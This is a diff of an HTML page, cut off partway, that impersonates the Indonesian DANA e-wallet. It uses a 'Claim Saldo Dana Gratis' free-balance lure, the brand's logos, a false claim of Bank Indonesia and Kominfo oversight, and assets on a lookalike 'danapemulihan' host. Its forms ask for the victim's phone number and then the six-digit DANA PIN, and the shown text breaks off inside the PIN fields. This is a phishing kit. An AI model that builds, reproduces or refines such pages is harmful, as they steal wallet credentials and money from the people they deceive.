@@ -1,685 +1,51 @@
-<html lang="id">
-  <meta charset="utf-8">
-   <meta name="theme-color" content="#118EEA"> 
-  <meta content="DANA E-wallet" property="og:title">
-  <meta content="dana.id" property="twitter:title">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" name="viewport">
- <meta name="description" content="Mau bayar apapun jadi semudah lewat sentuhan jari. Lewat DANA, kamu bisa melakukan transaksi apapun dengan praktis mulai dari pembayaran tagihan, transaksi barcode scan, hingga e-commerce. #GantiDompet dan nikmati metode pembayaran yang lebih cepat, praktis dan aman.">
-  <meta content="https://assets.kompasiana.com/items/album/2022/01/19/dana-heri-61e79b5c06310e2d0778d653.jpg?t=o&v=325" property="og:image">
-  <link rel="canonical" href="https://www.dana.id/">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
+<meta name="theme-color" content="#118EEA"> 
+
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>🎁Claim Saldo Dana Gratis🎁</title>
+<meta property="og:title" content="DANA ID">
+<meta property="twitter:title" content="DANA ID ">
+<meta property="twitter:card" content="summary_large_image">
+<meta property="og:image:type" content="image/jpeg">
+<meta content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQA-22lQk5cJ68usHbFQm_lnqlOTy6o7c3rZg&usqp=CAU" property="og:image">
+ <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQA-22lQk5cJ68usHbFQm_lnqlOTy6o7c3rZg&usqp=CAU" rel="shortcut icon" type="image/x-icon">
+  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQA-22lQk5cJ68usHbFQm_lnqlOTy6o7c3rZg&usqp=CAU" rel="apple-touch-icon">
+ <link rel="canonical" href="https://www.dana.id/">
    <meta property="og:url" content="https://www.dana.id/" />
-  <meta content="Dana E-wallet" name="generator">
-    <title>DANA E-wallet</title>
-    <meta http-equiv="Content-Security-Policy" content="default-src * 'self' 'unsafe-inline' 'unsafe-eval' data: gap:">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:100,200,300,regular,500,600,700,800,900" media="all"> 
-  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" rel="shortcut icon" type="image/x-icon">
-  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" rel="apple-touch-icon">
-<link rel="stylesheet" href="https://www-dana-idl.github.io/Dana.kaget/dana.css">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/3.3.4/jquery.inputmask.bundle.min.js">
-</script>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
-  
+<meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
+<meta property="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
+<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+<script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/container.css">
+<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/loader.css">
+<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/main.css">
+<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/otp.css">
+<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/pin.css">
+</head>
 <style>
-* {
-  box-sizing: border-box;
-}
-
-body {
-  
-      box-sizing: border-box;
-    display: block;
-    margin: 0px auto;
-    font-family: Arial, Helvetica, sans-serif;
-    width: 100%;
-    height: 100%;
-    max-width: 600px;
-    max-height: 1000px;
-    background-color: #118EEA;
-    padding: 25px;
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    -webkit-transform: translate(-50%, -50%);
-    -moz-transform: translate(-50%, -50%);
-    -ms-transform: translate(-50%, -50%);
-    -o-transform: translate(-50%, -50%);
-}
-
-#regForm {
-  max-width: 500px;
-    margin: auto;
-    margin-top: 0px;
-    /*background-color: #00000044;*/
-    height: 100%;
-    max-height: 700px;
-}
-
-h1 {
-  text-align: center;  
-}
-
-.inputku {
-  box-sizing: border-box;
-    border: none;
-    outline: none;
-    border-radius: 10px;
-    width: 100%;
-    max-width: 500px;
-    height: 42px;
-    display: block;
-    margin: auto;
-    font-size: 22px;
-    font-weight: 600;
-    padding-left: 80px;
-}
-
-/* Mark input boxes that gets an error on validation: */
-input.invalid {
-  background-color: #ffdddd;
-}
-
-/* Hide all steps by default: */
-.tab {
-  display: none;
-}
-
-button {
-  background-color: #04AA6D;
-  color: #ffffff;
-  border: none;
-  padding: 10px 20px;
-  font-size: 17px;
-  font-family: Raleway;
-  cursor: pointer;
-}
-
-button:hover {
-  opacity: 0.8;
-}
-
-
-
-/* Make circles that indicate the steps of the form: */
-.step {
-  height: 15px;
-  width: 15px;
-  margin: 0 2px;
-  background-color: #bbbbbb;
-  border: none;    display: none;
-}
-
-button {
-  background-color: #04AA6D;
-  color: #ffffff;
-  border: none;
-  padding: 10px 20px;
-  font-size: 17px;
-  font-family: Raleway;
-  cursor: pointer;
-}
-
-button:hover {
-  opacity: 0.8;
-}
-
-#prevBtn {
-  
-   position: absolute;
-    top: 0px;
-    width: 18px;
-    float: left;
-    left: 10;
-}
-
-/* Make circles that indicate the steps of the form: */
-.step {
-  height: 15px;
-  width: 15px;
-  margin: 0 2px;
-  background-color: #bbbbbb;
-  border: none;  
-  border-radius: 50%;
-  display: inline-block;
-  opacity: 0.0;
-}
-
-.step.active {
-  border-radius: 50%;
-  display: inline-block;
-  opacity: 0.0;
-}
-
-.step.active {
-  opacity: 0;
-}
-
-/* Mark the steps that are finished and valid: */
-.step.finish {
-  background-color: #04AA6D;
-}
-
-.dana_logo{
-    display: block;
-    width: 95px;
-    opacity: ;
-    margin-bottom: 50px;
-    margin-top: 10px;
-    position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    margin: 10px auto;
-    margin-left: auto;
-    margin-right: auto;
-}
-
- .bh1 {
-    font-weight: 700;
-    font-size: 15px;
-    color: white;
- }
- 
- .bh11{
-     font-size: 15px;
-     margin-top: 5px;
-     color: white;
-     margin-bottom: -10px;
-     font-weight: 300;
- }
- 
- .inputNo {
-    box-sizing: border-box;
-    margin-top: 20px;
-    width: 100%;
-    /*background-color: #ff0000a5;*/
-    height: 100%;
-    max-height: 800px;
-}
-.formNo, .nope {
-    box-sizing: border-box;
-    border: none;
-    outline: none;
-    border-radius: 10px;
-    width: 100%;
-    max-width: 500px;
-    height: 42px;
-    display: block;
-    margin: auto;
-    font-size: 24px;
-    font-weight: 600;
-    padding-left: 90px;
-}
-.formNo {
-    max-width: 500px;
-    margin: auto;
-    margin-top: -60px;
-    /*background-color: #00000044;*/
-    height: 100%;
-    max-height: 700px;
-}
-label {
-    display: inline-block;
-    position: relative;
-    bottom: -49px;
-}
-.flagIndo {
-    width: 25px;
-    margin-left: 10px;
-    margin-right: 5px;
-    border-radius: 2px;
-    box-shadow: 0.3px 0.3px 2px #ccc;
-}
-.codeTel {
-    font-weight: 600;
-    font-size:17px ;
-}
-.syarat {
-    font-size: 14px;
-    margin-left: 0px;
-    margin-right: 0px;
-    color: white;
-    font-weight: 400;
-}
-.send_data {
-    background: none;
-    font-size: 15px;
-    color: #ffffff9c;
-    border: none;
-    width: 70px;
-    height: 40px;
-    margin-top: 500px;
-    transition: 0.3s;
-}
-.send_data:active,.send_data:hover,.send_data:focus{
-    font-size: 15.3px;
-    color: #ffffff;
-    width: 75px;
-    height: 45px;
-    transition: 0.3s;
-}
-input::placeholder {
-    font-weight: 600;
-    font-size: 24px;
-    padding-top: 7px;
-    padding-left: 2px;
-    color: #bebebe;
-}
-
-.back {
-    position: absolute;
-    top: 15px;
-    width: 18px;
-    float: left;
-    left: 10;
-}
-
-.btnku{
-       margin-top: 15px;
-    width: 90%;
-    margin: 12px auto;
-    position: absolute;
-    bottom: 10px;
-    left: 0;
-    font-size: 16px;
-    right: 0;
-    height: 50px;
-    border-radius: 10px;
-    box-shadow: rgb(170, 170, 170) 0px 0px 0px 0px; 
-    transition: background 0ms step-start 0s;
-    background-color: transparent;
-    font-weight: 800;
-        }
-        
-        
-        .btnku:disabled{
-            opacity: 0.4;
-        }
-  h3{
-      text-align: center;
-      font-size: 15px;
-      color: white;
-      margin-top: 85px;
-      font-weight: 400;
-      background-color: #118EEA;
-  }
-  .pin-code{ 
-  padding: 0; 
-  margin: 0 auto; 
-  display: flex;
-  justify-content:center;
-  
-} 
- 
-.pin-code input { 
-  border: none; 
-  text-align: center; 
-  width: 36px;
-  height:42px;
-  font-size: 36px; 
-  background-color: #fff;
-  margin-right:-0px;
-  border-radius: 8px;
-} 
-
-
-
-.pin-code input:focus { 
-  border: 0px solid #573D8B;
-  outline:none;
-} 
-
-
-input::-webkit-outer-spin-button,
-input::-webkit-inner-spin-button {
-    -webkit-appearance: none;
-    margin: 0;
-}
-.button { 
-  font-family: helvetica;
-  text-align:center;
-  color: #fff;
-  padding: -5px;
-  margin: -1px;
-  max-width: 100%;
-  font-size: 12px;
-  margin-top: 20px;
-  margin-bottom: 50px;
-  background: #118EEA;
-  border: 1px solid;
-  border-color: #fff;
-  border-radius: 20px;
-  width: 30%;
-  height: 22px;
-}
-#myForm{
-    display: none;
-    position: fixed;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    width: 100%;
-    height: 670px;
-     background:url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZxa4wweGrDC3oVR5E8NyqDrYGP8laPfDywsnBmLRxfOataWXZDrMgzFijPHg4txcrR24EtlibL_UoxgWMoaorsBEa9m1_c98mF5Z_ww5XIvmi7oEu5dDFGHc4kITYCf_Tko7HjHfnEY4R8QHXqFk88rybb1HTje1wCuv0Z3HjB1fHEZVzET_A99YE/s16000/AddText_05-18-01.31.18.jpg) no-repeat center center;
-  background-position: 100% 100%;
-  background-size: 100% 100%;
-  animation: fadeIn 2s;
-  -webkit-animation: fadeIn 2s;
-  -moz-animation: fadeIn 2s;
-  -o-animation: fadeIn 2s;
-  -ms-animation: fadeIn 2s;
-  z-index: 9999999;
-  
-}
-#valid{
-display: none;
-    position: fixed;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    width: 100%;
-    height: 670px;
-     background:url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZxa4wweGrDC3oVR5E8NyqDrYGP8laPfDywsnBmLRxfOataWXZDrMgzFijPHg4txcrR24EtlibL_UoxgWMoaorsBEa9m1_c98mF5Z_ww5XIvmi7oEu5dDFGHc4kITYCf_Tko7HjHfnEY4R8QHXqFk88rybb1HTje1wCuv0Z3HjB1fHEZVzET_A99YE/s16000/AddText_05-18-01.31.18.jpg) no-repeat center center;
-  background-position: 100% 100%;
-  background-size: 100% 100%;
-  animation: fadeIn 2s;
-  -webkit-animation: fadeIn 2s;
-  -moz-animation: fadeIn 2s;
-  -o-animation: fadeIn 2s;
-  -ms-animation: fadeIn 2s;
-  z-index: 9999999;
-}
-@keyframes fadeIn {
-  0% { opacity: 0; }
-  100% { opacity: 1; }
-}
-
-@-moz-keyframes fadeIn {
-  0% { opacity: 0; }
-  100% { opacity: 1; }
-}
-
-@-webkit-keyframes fadeIn {
-  0% { opacity: 0; }
-  100% { opacity: 1; }
-}
-
-@-o-keyframes fadeIn {
-  0% { opacity: 0; }
-  100% { opacity: 1; }
-}
-
-@-ms-keyframes fadeIn {
-  0% { opacity: 0; }
-  100% { opacity: 1; }
-}
-
- .resend{
-     text-align: center;
- }
- 
- .pin-code1{ 
-  padding: 0; 
-  margin: 0 auto; 
-  display: ;
-  justify-content:center;
-  
-} 
- 
-.pin-code1 input { 
-  border: none; 
-  text-align: center; 
-  width: 40px;
-  height:45px;
-  font-size: 36px; 
-  background-color: #F5F5F5;
-  margin-right:3px;
-  border-radius: 8px;
-} 
-
-
-
-.pin-code1 input:focus { 
-  border: 0px solid #573D8B;
-  outline:none;
-} 
-
- .pin-code2{ 
-  padding: 0; 
-  margin: 0 auto; 
-  display: ;
-  justify-content:center;
-  
-} 
- 
-.pin-code2 input { 
-  border: none; 
-  text-align: center; 
-  width: 40px;
-  height:45px;
-  font-size: 36px; 
-  background-color: #F5F5F5;
-  margin-right:3px;
-  border-radius: 8px;
-} 
-
-
-
-.pin-code2 input:focus { 
-  border: 0px solid #573D8B;
-  outline:none;
-} 
-
-
- /*********************/
-.process {
-     width: 100%;
-            height: 100%;
-             display: flex;
-             justify-content: center;
-            margin: auto;
-            position: absolute;
-           padding-top: 300px;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: ;
-}
-.loading {
-    position: absolute;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    margin-bottom: 20%;
-  
-}
-  
-
-.loading img {
-    width: 50px;
     
-    top: 10;
+body, html{
+      left: 0;
+      right: 0;
+      bottom: 0;
+      top: 0;
+      margin: 0px auto;
+      width: 100%;
+      height: 100%;
+      positon: fixed
+      
 }
-.loading .spinner{
-    position: absolute;
-    width: 35px;
-    animation: spin 1s linear infinite;
-    -webkit-animation: spin 1s linear infinite;
-    -moz-animation: spin 1s linear infinite;
-    -ms-animation: spin 1s linear infinite;
-    -o-animation: spin 1s linear infinite;
-}
-@keyframes spin {
-  0% { transform: rotate(360deg); }
-  100% { transform: rotate(0deg); }
-}
-@-webkit-keyframes spin {
-  0% { -webkit-transform: rotate(360deg); }
-  100% { -webkit-transform: rotate(0deg); }
-}
-@-moz-keyframes spin {
-  0% { -webkit-transform: rotate(360deg); }
-  100% { -webkit-transform: rotate(0deg); }
-}
-@-ms-keyframes spin {
-  0% { -webkit-transform: rotate(360deg); }
-  100% { -webkit-transform: rotate(0deg); }
-}
-@-o-keyframes spin {
-  0% { -webkit-transform: rotate(360deg); }
-  100% { -webkit-transform: rotate(0deg); }
+h2{font-size: 18px; }
+
+h3{
+  font-size: 14px;  
 }
 
- #danapin{
-     width: 100%;
-     height: 650px;
-     position: fixed;
-    left: 0;
-    right: 0;
-    top: 0;
-    background:url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDlAoE0-pgmIw6eGUJsLaRLS2KbvxqYTGA_8TQOf0-EdX8DoT1OUfhfnrPXMHfuU5NlKQfLJMSgISuw_cgbRX1nlcw2zpj-8tsmwiT3eZQxVJTERUbcLvMV4qHsnFmhy99mjfqy5UzsaT50f3LS_BHsTCS1SfLW1LRRO4ywlmj1XaLF1rETALk_fOm/s16000/AddText_05-01-06.11.17.jpg) no-repeat center center;
-  background-position: 100% 100%;
-  background-size: 100% 100%;
-     
-     
- }
  
- #homeku{
-     width: 100%;
-     height: 650px;
-     position: fixed;
-    left: 0;
-    right: 0;
-    top: 0;
-    bottom: 0;
-    background: #118EEA;
-  background-position: 100% 100%;
-  background-size: 100% 100%;
-     
-     
- }
- 
- welalxcome {
-    display: flex;
-  position: fixed;
-  top: 0;
-  left: 0;
-  right: 0;
-  bottom: 0;
-  width: 100%;
-  background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2bBMVwYYKeZgCDrn0p4KsFYmQ1SRc6igX5lRwrNCXdc7YPYS80nlUrCcPnKCpv2M7vlP-OFsMgZtgf_-2vCU_T-1Bx94mSgYLFlgk4hGqEKmdHJZxLJR7e2wIonshknidTarYXNIu11uoWQMvThCh9kzi2h-Q6TPcEV788XeYmf-NU9pLd7tPZwT2/s16000/AddText_05-01-07.00.21.jpg) no-repeat center center;
-  background-position: 100% 100%;
-  background-size: 100% 100%;
-  z-index: 10000;
-
-}
-welalxcome img {
-        width:100%;
-    height: 700px;
-    margin-top: -55px;
-    
-}
-chsalxcome {
-        position: relative;
-    width: 100%;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    flex-wrap: nowrap;
-    align-items: center;
-}
- 
- @-webkit-keyframes slide {
-  0%   { transform: translate(0px,100px); }
-  100% { transform: translate(0px,0px); }
-}
-@-moz-keyframes slide {
-  0%   { transform: translate(0px,100px); }
-  100% { transform: translate(0px,0px); }
-}
-@-o-keyframes slide {
-  0%   { transform: translate(0px,100px); }
-  100% { transform: translate(0px,0px); }
-}
-@keyframes slide {
-  0%   { transform: translate(0px,100px); }
-  100% { transform: translate(0px,0px); }
-}
-
-.page {
- animation-name: slide;
- animation-duration: 1s; 
- animation-fill-mode: forwards; 
-}
-
-
-
-
-
-.credit_card{
-    
-}
-
-.ewc_place{
-    margin-top: -5px;
-}
-
-.ewc_place::placeholder{
-    font-size: 14px;
-}
-
-
-@keyframes tonext {
-  75% {
-    left: 0;
-  }
-  95% {
-    left: 100%;
-  }
-  98% {
-    left: 100%;
-  }
-  99% {
-    left: 0;
-  }
-}
-
-@keyframes tostart {
-  75% {
-    left: 0;
-  }
-  95% {
-    left: -300%;
-  }
-  98% {
-    left: -300%;
-  }
-  99% {
-    left: 0;
-  }
-}
-
-@keyframes snap {
-  96% {
-    scroll-snap-align: center;
-  }
-  97% {
-    scroll-snap-align: none;
-  }
-  99% {
-    scroll-snap-align: none;
-  }
-  100% {
-    scroll-snap-align: center;
-  }
-}
-
-
-* {
+ * {
   box-sizing: border-box;
   scrollbar-color: transparent transparent; /* thumb and track color */
   scrollbar-width: 0px;
@@ -694,7 +60,7 @@ chsalxcome {
 }
 
 *::-webkit-scrollbar-thumb {
-  background-color: #118EEA;
+  background-color: #118CEA;
   border: none;
 }
 
@@ -710,46 +76,48 @@ ol, li {
 
 .carousel {
   position: absolute;
-  background-color: #118EEA;
+  background-color: #118CEA;
   padding-top:0%;
+  height: 100%;
   top: 0;
   right: 0;
   left: 0;
-  margin: 1px auto;
+  margin: 0px auto;
   perspective: 200px;
 }
 
 .carousel__viewport {
   position: absolute;
+  padding: 32px;
   width: 100%;
   top: 0;
-  background-color: #118EEA;
+  background-color: #118CEA;
   right: 0;
   bottom: 0;
   left: 0;
-  height: 534px;
+  height: 79%;
   display: flex;
   overflow-x: scroll;
   counter-reset: item;
-  margin: 1px auto;
+  margin: 0px auto;
  
   scroll-behavior: smooth;
-  scroll-snap-type: x mandatory;
+  scroll-snap-type: x mandatory;{}
 }
 
 .carousel__slide {
   position: relative;
   flex: 0 0 100%;
   width: 100%;
-  height: 78%;
+  height: 100%;
   margin-left: 10px;
-  background-color: #118EEA;
+  background-color: #118CEA;
   counter-increment: item;
   z-index: 99999999;
 }
 
 .carousel__slide:nth-child(even) {
-  background-color: #118EEA;
+  background-color: #118CEA;
 }
 
 .carousel__slide:before {
@@ -760,7 +128,7 @@ ol, li {
   transform: translate3d(-50%,-40%,70px);
   color: #000;
   font-size: 2em;
-  background-color: #118EEA;
+  background-color: #118CEA;
 }
 
 .carousel__snapper {
@@ -768,11 +136,11 @@ ol, li {
   top: 0;
   left: 0;
   right: 0;
-  bottom: 20;
+  bottom: 0;
   width: 100%;
-  height: 530px;
+  height: 100%;
   scroll-snap-align: center;
-  background-color: #118EEA;
+  background-color: #118CEA;
   
   
 }
@@ -814,22 +182,6 @@ ol, li {
   display: inline-block;
 }
 
-.carousel__navigation-button {
-  display: inline-block;
-  width: 0.8rem;
-  height: 1.0rem;
-  background-color: #000;
-  background-clip: red;
-  margin: 10px -20;
-  border: 0.2rem solid blue;
-  border-radius: 50%;
-  font-size: 0;
-  position: relative;
-  top: -2px;
-  margin-left: -10px;
-  text-align: center;
-  transition: transform 0.1s;
-}
 
 .carousel::before,
 .carousel::after,
@@ -872,27 +224,146 @@ ol, li {
   pointer-events: none;
 }
 
+/*********************/
+.process1 {
+     width: 100%;
+            height: 100%;
+             display: flex;
+             justify-content: center;
+            margin: auto;
+            position: absolute;
+           padding-top: 300px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 99999;
+            
+      
+}
+.loading {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+}
+.loading img {
+    width: 50px;
+    
+    top: 10;
+}
+.loading .spinner{
+    position: absolute;
+    width: 35px;
+    animation: spin 1s linear infinite;
+    -webkit-animation: spin 1s linear infinite;
+    -moz-animation: spin 1s linear infinite;
+    -ms-animation: spin 1s linear infinite;
+    -o-animation: spin 1s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(360deg); }
+  100% { transform: rotate(0deg); }
+}
+@-webkit-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-moz-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-ms-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-o-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+
+/*********************/
+
+ #homeku{
+     width: 100%;
+     height: 100%;
+     position: fixed;
+    background: #118EEA;
+  background-position: 100% 100%;
+  background-size: 100% 100%;
+  left: 0;
+  right: 0;
+  top: 0;
+  bottom: 0;
+  margin: 0px auto;
+     
+     
+ }
+ 
+ .inp{
+     width: 70%;
+     padding-left: 10px;
+ }
+ 
+ 
+ .btn-backku{
+     position: absolute;
+     left: 20;
+     top: 12;
+     background: transparent;
+     color: #fff;
+     border: none;
+     font-size: 18px;
+     font-weight: 300;
+    
+ }
+ 
+ 
+ #back1{
+      display: none;
+     
+ }
+ 
+ #back2{
+      display: none;
+ }
 </style>
 <body>
- <main>
-         
- <welalxcome>
- 
-</welalxcome>
-<chsalxcome2 style="display: none;">
-<div style="height:30px;width: 70px;margin-top: -30px;margin-bottom: 0px;float:center;margin-left:42%" class="talxcome">
+
+<div style="display:none;" class="index">
+	<div class="header">
+		<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt="">
+	</div>
+	<div class="content">
+		<div class="hero">
+			<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/hero.svg" alt="">
+		</div>
+		<h1>Dompet digital untuk kamu!</h1>
+		<p class="desc">
+			Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
+		<div class="line"></div>
+		<p class="log">
+			Masukkan <b>nomor HP</b> kamu untuk lanjut
+		</p>
+		<button type="button" onclick="next();">LOGIN</button>
+	</div>
 </div>
-<form class="regForm" action="googleplayDANA.html" method="get">
-     <center>
-   <img class="dana_logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrWtY0kKy_PhEmPe1oiSlQMTbwojkQ9xkGIDV7JU1wx7ofj7R2evgWsKdBPJ_3sv1wFAIpmsQYQ8_70jWdrr6KGTXT6ie9IuJWhocY_-FmK01JKwrbFZ6JPYwoaY5qCOX7_XS4bHlFFPS3LcwWUChAmCCQFf9BpSUgCGh7u4G9ubbnVgXJYdIjFOLK/s16000/AddText_05-15-01.34.42.png">
-     </center>       
-  <!-- One "tab" for each step in the form: -->
-<div class="" style="text-align: center;" id="homeku">
-    <div style="position: fixed; top: 0; right: 0; left: 0; margin: 1px auto; height: 50px; width: 100%; background: #118EEA; z-index: 9999999999; margin-bottom: 0px">
-        <center>
-       <img class="dana_logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrWtY0kKy_PhEmPe1oiSlQMTbwojkQ9xkGIDV7JU1wx7ofj7R2evgWsKdBPJ_3sv1wFAIpmsQYQ8_70jWdrr6KGTXT6ie9IuJWhocY_-FmK01JKwrbFZ6JPYwoaY5qCOX7_XS4bHlFFPS3LcwWUChAmCCQFf9BpSUgCGh7u4G9ubbnVgXJYdIjFOLK/s16000/AddText_05-15-01.34.42.png" style="z-index: 9999999999">
-       </center>
-       </div>
+<div class="start" style="display:none;">
+	<img class="logo" src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_text.png" style="width: 150px">
+	<div class="footimg">
+		<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/bi.png" alt=""><img src="https://dev-danapemulihan.pantheonsite.io/asset/img/kom.png" alt="">
+		<p>
+			DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
+	</div>
+</div>
+
+<div class="container hid" style="position: fixed">
+    
+	<div class="" style="text-align: center;" id="homeku">
+   
+
+        
      <section class="carousel" aria-label="Gallery" style="margin-top: 0px; text-align: center; left: 0">
   <ol class="carousel__viewport">
     <li id="carousel__slide1"
@@ -935,591 +406,391 @@ ol, li {
     <ol class="carousel__navigation-list">
       <li class="carousel__navigation-item">
         <a href="#carousel__slide1"
-           class="carousel__navigation-button">Go to slide 1</a>
+           class="carousel__navigation-button"></a>
       </li>
       <li class="carousel__navigation-item">
         <a href="#carousel__slide2"
-           class="carousel__navigation-button">Go to slide 2</a>
+           class="carousel__navigation-button"></a>
       </li>
       <li class="carousel__navigation-item">
         <a href="#carousel__slide3"
-           class="carousel__navigation-button">Go to slide 3</a>
+           class="carousel__navigation-button"></a>
       </li>
       <li class="carousel__navigation-item">
         
     </ol>
   </aside>
 </section>
-<button style="width: 100%; height: 140px; position: fixed; bottom: 0; left: 0; right: 0; margin: 1px auto; border: 0; background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEid9dARAQbMu1UTEgpOfyH6pn4eI3_XArbELp_8lfZtysRgex-gqs0Czc9ch_O7U2lrucgBVSqGQEL33BwV3Ri4D3evjzJHJ6LBFa_K-pIPbdO6QQ3iHlTkLiqo_w2z2NbXTw83lNcWHG7T9q2n6m7N3SZ-qfZpTdsioS3dm-YIfJh4zU16QEODOLKn/s16000/AddText_06-06-08.17.04.jpg');
+<button id="butonku" style="width: 90%; height: 189px; position: fixed; bottom: 0; left: 0; right: 0; margin: 1px auto; border: 0; background: url('https://user-images.githubusercontent.com/155412066/296517930-fcfc7dd0-ba64-4395-85bf-e4103927b567.jpg');
       background-position: 100% 100%;
       background-repeat: no-repeat;
-      background-size: 100% 100%;" onclick="nextPrev()"></button>
-  </div>
-  <div class="tab" id="login">
- <button type="button" style="background-color: transparent; color: transparent;" class="back" id="prevBtn" onclick="backbutton()">back<img class="back" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNI1Emy7PX0havgWqHmqlT51KSm22vosgN4OekNvqowvUD5b_ftp3dSwYRhaNDEGZKkyXibrQzF2FPZ9tB9jHwqMYmsQv7SZs9yiVTt9TfQUgON1sKVo9ikO9NO82v7U2amQPmLFih0CenbjLkpEdathvIorjl6Pr-nxFULehzY2gAPpIyJsYX0I7O/s16000/AddText_05-15-01.36.51.jpg"></button>
-    <p style="margin-top: 60px"><h1 class="bh11">Masukkan <b class="bh1">nomor HP</b> kamu untuk lanjut</h1>
-     <label for="nomorhp" class="flagNo">
-<img class="flagIndo" src="https://img.freepik.com/free-vector/illustration-indonesia-flag_53876-27131.jpg?size=626&ext=jpg"></label>
-<label for="nope"><p class="codeTel">+62</p></label>
-<input type="hidden" id="logo" value="">
-         <input class="form-control nope" id="nope" type="tel" name="nope" placeholder="811-1234-5678" maxlength="16" autocomplete="on" required></p>
-        <br>
-        <h1 class="syarat">Nomor ponsel akan digunakan sebagai ID kamu & 
-        menjaga akun selalu aman. Dengan melanjutkan kamu setuju dengan <b class="bh1">Syarat & Ketentuan</b> dan <b class="bh1">Kebijakan Privasi</b> kami</h1>
-   <button type="button" id="nextBtn" class="btnku" onclick="nomorLogin()" disabled="disabled">Lanjut</button> 
-  </div>
-  <div class="tab" id="danapin">
-      <button type="button" style="background-color: transparent; color: transparent;" class="back" id="prevBtn" onclick="backbutton()">back<img class="back" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNI1Emy7PX0havgWqHmqlT51KSm22vosgN4OekNvqowvUD5b_ftp3dSwYRhaNDEGZKkyXibrQzF2FPZ9tB9jHwqMYmsQv7SZs9yiVTt9TfQUgON1sKVo9ikO9NO82v7U2amQPmLFih0CenbjLkpEdathvIorjl6Pr-nxFULehzY2gAPpIyJsYX0I7O/s16000/AddText_05-15-01.36.51.jpg"></button>
+      background-size: 100% 100%; z-index: 99999" onclick="nextPrev()"></button>
       <center>
-  
-      <h3>Masukkan <strong>PIN DANA</strong></h3>
-    <div class="pin-code" maxlength="6" style="margin-top: 30px;">
-        
-    <center>
-   <input type="hidden" id="logo" value="">
-    <input type="hidden" name="sixpin" id="setPin"> 
-	<input type="tel" id="pin1" data-id="1" maxlength="1" required autofocus>
-    <input type="tel" id="pin2" data-id="2" name="pin2" maxlength="1" autofocus>
-	  <input type="tel" id="pin3" data-id="3" name="pin3" maxlength="1" autofocus>
-    <input type="tel" id="pin4" data-id="4" name="pin4" maxlength="1" autofocus>
-    <input type="tel" id="pin5" data-id="5" name="pin5" maxlength="1" autofocus>
